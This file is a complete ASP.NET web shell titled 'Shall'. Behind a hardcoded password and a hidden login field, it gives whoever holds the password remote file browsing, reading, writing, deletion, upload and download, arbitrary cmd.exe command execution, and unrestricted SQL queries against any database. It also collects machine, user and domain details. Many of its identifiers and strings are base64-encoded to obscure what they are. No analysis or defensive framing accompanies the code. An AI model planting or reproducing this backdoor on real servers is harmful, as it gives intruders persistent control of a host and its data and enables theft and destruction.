<%@ Page Language="C#" Debug="true" validateRequest="false" %>
<%@ Import namespace="System.Web.UI.WebControls" %>
<%@ Import namespace="System.Diagnostics" %>
<%@ Import namespace="System.IO" %>
<%@ Import namespace="System" %>
<%@ Import namespace="System.Data" %>
<%@ Import namespace="System.Data.SqlClient" %>
<%@ Import namespace="System.Security.AccessControl" %> 
<%@ Import namespace="System.Security.Principal" %>
<%@ Import namespace="System.Collections.Generic" %> 
<%@ Import namespace="System.Collections" %> 

<script runat="server">

public static string getnewstring (string encodedString)
{
	byte[] data = Convert.FromBase64String(encodedString);
string decodedString = System.Text.Encoding.UTF8.GetString(data);
return decodedString;
}


private const string password = "india1947";  
private const string style = "dark";  




protected void Page_Load(object sender, EventArgs e)
{
	//this.Remote(password);
	this.Login(password);
	this.Style(); 
	this.ServerInfo(); 
	

	
	
	if(this.Action() == getnewstring("ZmJyb3dzZXI=")) { 
		this.FileBrowser(this.CurrentPath());
		div_file_browser.Visible = true;
	} else if(this.Action() == getnewstring("ZmVkaXRvcg==")) { 
		fedit_path.Text = this.fPath(); 
		div_file_editor.Visible = true;
	} else if(this.Action() == getnewstring("ZnVwbG9hZGVy")) { 
		if(fupl_path.Text == "") fupl_path.Text = this.CurrentPath();
		div_file_uploader.Visible = true;
	} else if(this.Action() == getnewstring("Y21k")) { 
		div_run_cmd.Visible = true;
	} else if(this.Action() == getnewstring("c3Fs")) { 
		sql_con_str.Text = this.sqlConnStr(); 
		if(Request.QueryString[getnewstring("dGFibGU=")] != null) this.SqlManager(sender, e); 
		div_sql_queries.Visible = true;
	} else if(this.Action() == getnewstring("ZXhpdA==")) { 
		this.Logout();
	}
}

private string thisUrl() 
{
	string url = Request.Url.ToString(); 
	if(url.Contains("?")) url = url.Substring(0, url.IndexOf("?")); 
	return url; 
}

private string rootDir() 
{
	return Request.MapPath(".") + "\\";
}

private string Action() 
{
	return (!String.IsNullOrEmpty(Request.QueryString[getnewstring("YWN0")])) ? Request.QueryString[getnewstring("YWN0")] : ""; 
}

public string CurrentPath()
{
	if(Request.Cookies[getnewstring("c2hlbGxfcGF0aA==")] == null) { 
		Response.Cookies[getnewstring("c2hlbGxfcGF0aA==")].Value = this.rootDir();
	} else if(Request.QueryString[getnewstring("ZGly")] != null) { 
		Response.Cookies[getnewstring("c2hlbGxfcGF0aA==")].Value = Request.QueryString[getnewstring("ZGly")]; 
		if(Directory.Exists(Request.QueryString[getnewstring("ZGly")])) return Request.QueryString[getnewstring("ZGly")];
	} else { 
		if(Directory.Exists(Request.Cookies[getnewstring("c2hlbGxfcGF0aA==")].Value)) return Request.Cookies[getnewstring("c2hlbGxfcGF0aA==")].Value; 
		Response.Cookies[getnewstring("c2hlbGxfcGF0aA==")].Value = this.rootDir(); 
	}
	return this.rootDir();
}

private void Login(string password) 
{
	if(Request.Cookies[getnewstring("c2hlbGxfcGFzcw==")] != null) { 
		if(Request.Cookies[getnewstring("c2hlbGxfcGFzcw==")].Value == password) return;
	}
	Response.Write("<html><form method='POST'><input style='border:0px' type='text' name='password'></form></html>");
	
	if(Request.Form[getnewstring("cGFzc3dvcmQ=")] == password) { 
		Response.Cookies[getnewstring("c2hlbGxfcGFzcw==")].Value = password;
		Response.Redirect(this.thisUrl());
	} else { 
		Response.End(); 
	}
}

private void Logout() 
{
	Response.Cookies[getnewstring("c2hlbGxfcGFzcw==")].Value = null;
	Response.Cookies[getnewstring("c2hlbGxfcGF0aA==")].Value = null;
	Response.Cookies[getnewstring("c2hlbGxfc3Fs")].Value = null;
	Response.Redirect(this.thisUrl());
}

private void Remote(string password) 
{
	// todo
}

private void ServerInfo() 
{
	try { 
		srv_info_1.Text = "<th>" + Environment.OSVersion.ToString() + "</th>"; 
		srv_info_1.Text += "<th>" + Request.ServerVariables[getnewstring("U0VSVkVSX1NPRlRXQVJF")] + "</th>"; 
		srv_info_1.Text += "<th></th><th></th>"; 
	} catch(Exception ex) { 
		srv_info_1.Text = "<th>" + ex.Message + "</th>";
	}
	try { 
		srv_info_2.Text = getnewstring("PHRoPkNvbXB1dGVyOiAg") + Environment.MachineName + "</th>"; 
		srv_info_2.Text += getnewstring("PHRoPkRvbWFpbjogIA==") + Environment.UserDomainName + "</th>";
		srv_info_2.Text += getnewstring("PHRoPlVzZXI6ICA=") + Environment.UserName + "</th>";
		srv_info_2.Text += getnewstring("PHRoPklQOiAg") + Request.ServerVariables[getnewstring("TE9DQUxfQUREUg==")] + "</th>"; 
	} catch(Exception ex) { 
		srv_info_1.Text = "<th>" + ex.Message + "</th>";
	}
}

private string getCwd(string path) 
{
	string cwd = "";
	string tmp_path = ""; 
	
	foreach(string part in path.Split('\\')) {
		if (part.Length > 0) { 
			tmp_path += part + "\\";
			cwd += "<a href='?act=fbrowser&dir=" + HttpUtility.UrlEncode(tmp_path) + "'>" + part + "\\</a>";
		}
	}
	return cwd;
}

private string getDrives() 
{
	string drives = ""; 
	string drive_root = "";
	
	foreach(DriveInfo curdrive in DriveInfo.GetDrives()) {
		if(curdrive.IsReady) { 
			drive_root = curdrive.RootDirectory.Name;
			drives += "<a href='?act=fbrowser&dir=" + HttpUtility.UrlEncode(drive_root) + "'>" + drive_root + "</a>&nbsp;&nbsp;";
		} else {
			drives += curdrive.ToString() + "&nbsp;&nbsp;";
		}
	}
	return drives; 
}

public void FileBrowser(string path)
{
	DirectoryInfo di;
	
	get_cwd.Text = this.getCwd(path);
	get_drve.Text = this.getDrives();
	go_home.Text = "<a href='?act=fbrowser&dir=" + this.rootDir() + "'>Home</a>";
	
	try {
		di = new DirectoryInfo(path);
	} catch(Exception ex) {
		file_browser.Text = "<tr><th>" + ex.Message + "</th></tr>";
		return;
	}
	
	if(di.FullName.ToString() != di.Root.ToString()) {
		file_browser.Text += "<tr style='color:" + this.Colors()["color"] + "; background-color:" + this.Colors()["back"] + "';>"; 
		file_browser.Text += "<td><a href='?act=fbrowser&dir=" + HttpUtility.UrlEncode(di.Parent.FullName + "\\") + "'>";
		file_browser.Text += "..</a></td><td></td><td></td><td></td><td></td><td></td></tr>";
	}
	
	try { 
		foreach(DirectoryInfo d in di.GetDirectories()) {
			file_browser.Text += "<tr><td><a href='?act=fbrowser&dir=" + HttpUtility.UrlEncode(d.FullName + "\\") + "'>";
			file_browser.Text += d.Name + "</a></td><td>Dir</td><td>" + this.fPermissions(d.FullName) + "</td>";
			file_browser.Text += "<td>" + d.CreationTime.ToString(@"MM/dd/yyyy HH\:mm") + "</td>"; 
			file_browser.Text += "<td>" + d.LastAccessTime.ToString(@"MM/dd/yyyy HH\:mm") + "</td>"; 
			file_browser.Text += "<td>" + d.LastWriteTime.ToString(@"MM/dd/yyyy HH\:mm") + "</td></tr>";
		}
		
		foreach(FileInfo f in di.GetFiles()) {
			file_browser.Text += "<tr><td><a href='?act=feditor&file=" + HttpUtility.UrlEncode(f.FullName) + "'>";
			file_browser.Text += f.Name + "</a></td><td>" + this.fSize(f.Length) + "</td><td>" + this.fPermissions(f.FullName) + "</td>"; 
			file_browser.Text += "<td>" + f.CreationTime.ToString(@"MM/dd/yyyy HH\:mm") + "</td>"; 
			file_browser.Text += "<td>" + f.LastAccessTime.ToString(@"MM/dd/yyyy HH\:mm") + "</td>"; 
			file_browser.Text += "<td>" + f.LastWriteTime.ToString(@"MM/dd/yyyy HH\:mm") + "</td></tr>";
		}
	} catch(Exception ex) {
		file_browser.Text = "<tr><th>" + ex.Message + "</th></tr>";
	}
}

private string fPermissions(string path) 
{
	AuthorizationRuleCollection rules;
	WindowsIdentity sid;
	
	try {
		sid = WindowsIdentity.GetCurrent();
		if(File.Exists(path)) rules = File.GetAccessControl(path).GetAccessRules(true, true, typeof(SecurityIdentifier));
		else if(Directory.Exists(path)) rules = File.GetAccessControl(path).GetAccessRules(true, true, typeof(SecurityIdentifier));
		else return "? ? ?"; 
	} catch (Exception ex) { 
		return ex.Message; //"Denied";
	}
	foreach(FileSystemAccessRule rule in rules) {
		if(rule.IdentityReference.ToString() != sid.User.Value && !sid.Groups.Contains(rule.IdentityReference)) continue; 
		return rule.AccessControlType + " : " + rule.FileSystemRights;
	}
	return "? ? ?";
}

private string fSize(double flen) 
{
	if(flen > (1024 * 1024 * 1024)) return ((int)flen / (1024 * 1024 * 1024)).ToString() + " GB";
	if(flen > (1024 * 1024)) return ((int)flen / (1024 * 1024)).ToString() + " MB";
	if(flen > 1024) return ((int)flen / 1024).ToString() + " KB";
	return flen.ToString() + " B"; 
}

public void FileEditor(object sender, EventArgs e)
{ 
	string path = fedit_path.Text;
	string mode = ((Button)sender).ID;
	
	fedit_out.Text = "";
	if(mode == getnewstring("ZmVkaXRfcmVhZA==")) {
		fedit_text.Text = this.fRead(path);
	} else if(mode == getnewstring("ZmVkaXRfd3JpdGU=")) {
		fedit_out.Text = (this.fWrite(path, fedit_text.Text)) ? " Saved. " : " Failed. ";
	} else if(mode == getnewstring("ZmVkaXRfcmVtb3Zl")) {
		fedit_out.Text = (this.fdRemove(path)) ? " Removed. " : " Failed. ";
	} else if(mode == getnewstring("ZmVkaXRfcmVuYW1l")) {
		fedit_out.Text = (this.fdRename(Request.QueryString["file"], path)) ? " Renamed. " : " Failed. ";
	} else if(mode == getnewstring("ZmVkaXRfbWtkaXI=")) {
		fedit_out.Text = (this.mkDir(path)) ? " Created. " : " Failed. ";
	} else if(mode == getnewstring("ZmVkaXRfZG5sb2Fk")) {
		this.fDownload(path);
	}
}

private string fPath() 
{
	if(fedit_path.Text == "") return (Request.QueryString["file"] == null) ? this.CurrentPath() : Request.QueryString["file"];
	return fedit_path.Text;
}

private string fRead(string path) 
{
	if(File.Exists(path)) {
		try { 
			StreamReader sr = new StreamReader(path, Encoding.Default);
			string data = sr.ReadToEnd();
			sr.Close();
			return data; 
		} catch(Exception ex) {
			return ex.Message;
		}
	} 
	return "Can't access file: " + path;
}

private bool fWrite(string path, string text) 
{
	if(Directory.Exists(path)) return false; 
	try { 
		StreamWriter sw = new StreamWriter(path, false, Encoding.Default);
		sw.Write(text);
		sw.Close();
		return true;
	} catch {
		return false;
	}
	return false;
}

private bool fdRemove(string path)
{ 
	try  {
		if(File.Exists(path)) File.Delete(path);
		else if(Directory.Exists(path)) Directory.Delete(path);
		else return false;
		return true; 
	} catch {
		return false;
	}
	return false;
}

private bool fdRename(string path, string new_path) 
{
	try  {
		if(File.Exists(path)) File.Move(path, new_path);
		else if(Directory.Exists(path)) Directory.Move(path, new_path);
		else return false;
		return true; 
	} catch {
		return false;
	}
	return false;
}

private bool mkDir(string path) 
{
	try {
		Directory.CreateDirectory(path); 
		return true; 
	} catch {
		return false;
	}
	return false;
}

private void fDownload(string path) 
{
	if(Directory.Exists(path)) return; 
	string file_name = path.Split('\\')[(path.Split('\\').Length - 1)];
	
	Response.ClearContent();
	Response.ContentType = getnewstring("YXBwbGljYXRpb24vZm9yY2UtZG93bmxvYWQ=");
	Response.AppendHeader("Content-Disposition", "attachment; filename=" + file_name);
	Response.TransmitFile(path);
	Response.End(); 
}

public void FileUploader(object sender, EventArgs e)
{ 
	fupl_out.Text = ""; 
	if(!fupl_file.HasFile) return;
	try { 
		fupl_file.SaveAs(fupl_path.Text + fupl_file.FileName);
		fupl_out.Text = "File: '" + fupl_file.FileName + "' uploaded";
	} catch(Exception ex) {
		fupl_out.Text = ex.Message;
	}
} 

public void RunCmd(object sender, EventArgs e)
{
	cmd_out.Text = this.CmdExec(cmd_txt.Text);
}

private string CmdExec(string cimde) 
{
	string cmd_exec;
	Process p = new Process();
	
	p.StartInfo.FileName = getnewstring(("Y21kLmV4ZQ=="));
	p.StartInfo.Arguments = "/c " + cimde;
	p.StartInfo.CreateNoWindow = true;
	p.StartInfo.UseShellExecute = false;
	p.StartInfo.RedirectStandardOutput = true;
	p.StartInfo.RedirectStandardError = true;
	p.StartInfo.WorkingDirectory = this.CurrentPath();
	try { 
		p.Start();
		cmd_exec = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd(); 
	} catch(Exception ex) {
		cmd_exec = ex.Message; 
	}
	return cmd_exec; 
}

public string sqlConnStr() 
{
	if(sql_con_str.Text == "" && Request.Cookies[getnewstring("c2hlbGxfc3Fs")] != null) return Server.UrlDecode(Request.Cookies[getnewstring("c2hlbGxfc3Fs")].Value);
	else return sql_con_str.Text;
}

public void SqlManager(object sender, EventArgs e) 
{ 
	SqlConnection sql_conn = new SqlConnection();
	SqlCommand sql_cmd = new SqlCommand();
	
	string control = ((Control)sender).ID;
	string show_dbs = getnewstring("U0VMRUNUIG5hbWUgRlJPTSBtYXN0ZXIuZGJvLnN5c2RhdGFiYXNlcw=="); 
	string show_tables = getnewstring("U0VMRUNUICogRlJPTSBJTkZPUk1BVElPTl9TQ0hFTUEuVEFCTEVTOw=="); 
	string query = show_tables; 
	
	if(Request.QueryString["table"] != null) query = "SELECT * FROM " + Request.QueryString["table"] + ";"; 
	if(control == "sql_sub") query = (sql_qry.Text == "") ? show_tables : sql_qry.Text; 
	
	sql_cmd.CommandText = query;
	sql_cmd.CommandType = CommandType.Text;
	sql_cmd.Connection = sql_conn;
	sql_out.Text = control;
	
	try { 
		sql_conn.ConnectionString = sql_con_str.Text; 
		sql_conn.Open();
		Response.Cookies[getnewstring("c2hlbGxfc3Fs")].Value = HttpUtility.UrlEncode(sql_con_str.Text); 
		if(query.Trim().ToUpper().StartsWith(getnewstring("U0VMRUNU")) || query.Trim().ToUpper().StartsWith(getnewstring("U0hPVw=="))) { 
			SqlDataReader sql_reader = sql_cmd.ExecuteReader();
			sql_out.Text = this.sqlRead(sql_reader);
		} else {
			sql_out.Text = sqlExec(sql_cmd);
		}
		sql_conn.Close();
	} catch(Exception ex) {
		sql_out.Text = "<b>" + ex.Message + "</b>";
		return ;
	}
}

private string sqlRead(SqlDataReader sql_reader) 
{
	string sequel_data = "<br><table class='sql'>";
	sequel_data += "<tr>";
	for (int i = 0; i < sql_reader.FieldCount; i++) sequel_data += "<th>" + sql_reader.GetName(i) + "</th>";
	sequel_data += "<tr>";

	while(sql_reader.Read()) { 
		sequel_data += "<tr>";
		for (int i = 0; i < sql_reader.FieldCount; i++) { 
			if(sql_reader.GetName(i) == getnewstring("VEFCTEVfTkFNRQ==")) { 
				sequel_data += "<td><a href='?act=sql&table="; 
				sequel_data += Server.UrlEncode(sql_reader[i].ToString()) + "'>" + sql_reader[i].ToString() + "</a></td>"; 
			} else {
				sequel_data += "<td>" + Server.HtmlDecode(sql_reader[i].ToString()) + "</td>"; 
			}
		}
		sequel_data += "</tr>";
	}
	sequel_data += "</table>";
	return sequel_data; 
}

private string sqlExec(SqlCommand sql_cmd) 
{
	int i;
	string sequel_axoc = sql_cmd.ExecuteNonQuery().ToString();
	if(Int32.TryParse(sequel_axoc, out i)) return getnewstring("PGI+U1FMIHF1ZXJ5IGV4ZWN1dGVkIHN1Y2Nlc3NmdWxseS4g") + sequel_axoc + "<b>";
	return sequel_axoc;
}

public Dictionary<string, string> Colors()
{
	Dictionary<string, string> colors = new Dictionary<string, string>();
	colors[getnewstring("Y29sb3I=")] = (style == getnewstring("ZGFyaw==")) ? getnewstring("I2RkZWZmZg==") : getnewstring("IzE4MTgxOA==");
	colors[getnewstring("YmFjaw==")] = (style == getnewstring("ZGFyaw==")) ? getnewstring("IzE4MTgxOA==") : getnewstring("I2YwZjhmZg==");
	colors[getnewstring("bGluaw==")] = (style == getnewstring("ZGFyaw==")) ? getnewstring("I2RkZWZmZg==") : getnewstring("IzAxNWZiMg==");
	colors[getnewstring("dmlzaXRlZA==")] = (style == getnewstring("ZGFyaw==")) ? getnewstring("IzgzYzVmZg==") : getnewstring("IzAwNDM3ZQ==");
	colors[getnewstring("aG92ZXI=")] = (style == getnewstring("ZGFyaw==")) ? getnewstring("IzIwMjAyMA==") : getnewstring("I2RkZWZmZg==");
	return colors;
}

public void Style() 
{
	Dictionary<string, string> color = this.Colors();
	
	css_body.Text = " color:" + color["color"] + "; background-color:" + color["back"] + "; ";
	css_tbl.Text = " color:" + color["color"] + "; background-color:" + color["back"] + "; ";
	css_fb_tr.Text = " color:" + color["color"] + "; background-color:" + color["back"] + "; ";
	css_fb_tr_1.Text = " style='color:" + color["color"] + "; background-color:" + color["back"] + "'; "; 
	css_fb_tr_2.Text = " style='color:" + color["color"] + "; background-color:" + color["back"] + ";' "; 
	css_fb_tr_hv.Text = " color:" + color["color"] + "; background-color:" + color["hover"] + "; ";
	css_sql_tbl.Text = " color:" + color["color"] + "; background-color:" + color["back"] + "; border:1px solid " + color["color"] + "; ";
	css_sql_th.Text = " color:" + color["color"] + "; background-color:" + color["back"] + "; border:1px solid " + color["color"] + "; ";
	css_sql_tr.Text = " color:" + color["color"] + "; background-color:" + color["back"] + "; ";
	css_sql_tr_hv.Text = " color:" + color["color"] + "; background-color:" + color["hover"] + "; "; 
	if(style == "dark") css_inp.Text = " color:" + color["back"] + "; background-color:" + color["color"] + "; border:1px solid " + color["visited"] + "; ";
	else css_inp.Text = " color:" + color["hover"] + "; background-color:#242424 ; border:1px solid " + color["link"] + "; ";
	css_a_l.Text = "color:" + color["link"] + "; ";
	css_a_v.Text = "color:" + color["visited"] + "; ";
	css_menu_a.Text = "color:" + color["color"] + "; ";
}

</script>
<html>
<head>
	<title>Shall</title>
	<style>
		body { <asp:Literal runat="server" ID="css_body" /> text-align:left; padding:2px; font-size:12px; }
		table { <asp:Literal runat="server" ID="css_tbl" /> border-collapse:collapse; width:100%; padding:2px; font-size:12px; }
		th { font-size:13px; text-align:left; padding:2px; }
		td { font-size:12px; text-align:left; padding:2px; }
		table.fbrowser tr { <asp:Literal runat="server" ID="css_fb_tr" /> }
		table.fbrowser tr:hover { <asp:Literal runat="server" ID="css_fb_tr_hv" /> } 
		.sql { <asp:Literal runat="server" ID="css_sql_tbl" /> width:100%; padding:2px; font-size:12px; }
		.sql th { <asp:Literal runat="server" ID="css_sql_th" /> }
		.sql td { font-size:12px; text-align:left; padding:2px; } 
		.sql tr { <asp:Literal runat="server" ID="css_sql_tr" /> } 
		.sql tr:hover { <asp:Literal runat="server" ID="css_sql_tr_hv" /> <?php echo Colors("hover"); ?> }
		input { <asp:Literal runat="server" ID="css_inp" /> font-size:12px; padding:2px; } 
		form { padding:0px; }
		textarea { width:100%; height:100%; }
		div { padding:0px; }
		.sep { padding:2px; }
		a:link { <asp:Literal runat="server" ID="css_a_l" />  }
		a:visited { <asp:Literal runat="server" ID="css_a_v" />  }
		.menu { text-align:left; padding:2px; font-size:13px; }
		.menu a { <asp:Literal runat="server" ID="css_menu_a" /> text-decoration:none; }
	</style>
</head>
<body>
<div class="sep">
	<table>
		<tr><asp:Literal runat="server" ID="srv_info_1" /></tr>
		<tr><asp:Literal runat="server" ID="srv_info_2" /></tr>
	</table>
</div>
<div class="sep">
	<hr>
	<table class="menu"> 
		<tr>
			<th><a href="?act=fbrowser">FileBrowser</a></th>
			<th><a href="?act=feditor">FileEditor</a></th>
			<th><a href="?act=fuploader">FileUploader</a></th>
			<th><a href="?act=cmd">RunCmd</a></th>
			<th><a href="?act=sql">SqlQueries</a></th>
			<th><a href="?act=exit">Exit</a></th>
		</tr>
	</table>
	<hr>
</div>
<div class="sep" id="div_file_browser" runat="server" visible=false>
	<table class="fbrowser">
		<tr <asp:Literal runat="server" ID="css_fb_tr_1" /> >
			<th>CWD: <asp:Literal runat="server" ID="get_cwd" /></th>
			<th class="menu"><asp:Literal runat="server" ID="go_home" /></th>
			<th>Drives: <asp:Literal runat="server" ID="get_drve" /></th>
			<th></th>
			<th></th>
		</tr>
		<tr <asp:Literal runat="server" ID="css_fb_tr_2" /> >
			<th>Name</th><th>Size</th><th>Permissions</th><th>Created</th><th>Accessed</th><th>Modified</th>
		</tr>
		<asp:Literal runat="server" ID="file_browser" Mode="PassThrough" />
	</table>
</div>
<div class="sep">
<form id="main_form" runat="server" >
	<span id="div_file_editor" runat="server" visible=false>
		<asp:TextBox runat="server" ID="fedit_path" Width="400" />
		<asp:Button runat="server" ID="fedit_read" OnClick="FileEditor" Text="Read >>" />
		<asp:Button runat="server" ID="fedit_write" OnClick="FileEditor" Text="Write >>" />
		<asp:Button runat="server" ID="fedit_remove" OnClick="FileEditor" Text="RMove >>" />
		<asp:Button runat="server" ID="fedit_rename" OnClick="FileEditor" Text="RName >>" />
		<asp:Button runat="server" ID="fedit_mkdir" OnClick="FileEditor" Text="MkDir >>" />
		<asp:Button runat="server" ID="fedit_dnload" OnClick="FileEditor" Text="DnLoad >>" />
		&nbsp;&nbsp;&nbsp;<b><asp:Literal runat="server" ID="fedit_out" Mode="PassThrough" /></b>
		<pre><asp:TextBox id="fedit_text" TextMode="multiline" Columns="120" Rows="50" runat="server" /></pre>
	</span>
	<span id="div_file_uploader" runat="server" visible=false>
		<asp:TextBox runat="server" ID="fupl_path" Width="400" />
		<asp:FileUpload runat="server" ID="fupl_file" />
		<asp:Button runat="server" ID="fupl_sub" OnClick="FileUploader" Text=" >>" />
		&nbsp;&nbsp;&nbsp;<b><asp:Literal runat="server" ID="fupl_out" Mode="PassThrough" /></b>
	</span>
	<span id="div_run_cmd"  runat="server" visible=false>
		<asp:TextBox runat="server" ID="cmd_txt" Text="cmd" Width="500" />
		<asp:Button runat="server" ID="cmd_sub" OnClick="RunCmd" Text=" >>" />
		<pre><asp:Literal runat="server" ID="cmd_out" Mode="Encode" /></pre>
	</span>
	<span id="div_sql_queries" runat="server" visible=false>
		<asp:TextBox runat="server" ID="sql_con_str" Width="450" Value="Connection String" />
		<asp:TextBox runat="server" ID="sql_qry" Value="Query" Width="450" />
		<asp:Button runat="server" ID="sql_sub" OnClick="SqlManager" Text=" >>" />
		<div><asp:Literal runat="server" ID="sql_out" Text=""/></div>
	</span>
</form>
</div>
</body>
</html>